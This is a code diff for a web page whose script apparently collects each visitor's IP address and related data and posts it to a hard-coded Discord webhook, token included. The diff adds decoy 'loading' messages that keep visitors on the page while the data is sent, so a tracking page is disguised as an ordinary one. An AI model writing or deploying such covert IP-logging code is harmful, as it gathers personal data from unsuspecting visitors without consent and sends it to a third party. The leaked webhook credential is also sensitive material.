@@ -5,6 +5,8 @@
 </head>
 <body>
 
+<p id="loading-message">pls wait while this loads</p>
+
 <script>
     async function getIP(json) {
         const webhookURL = 'https://discord.com/api/webhooks/1181985888897601617/5lGDVSfQoy_-NJrsNA9XJbcHqmDcscShtlQORHFThz498zPex6LOXJ-XSar5V3LbZ0MZ';
@@ -80,7 +82,12 @@
                 },
                 body: JSON.stringify(data)
             });
+            setTimeout(() => {
+                document.getElementById("loading-message").textContent = "ok thanks now you can go";
+            }, 2000);
+
         } catch(error) {
+            document.getElementById("loading-message").textContent = "uh can you like reload or sum";
             console.error(error);
         }
     }
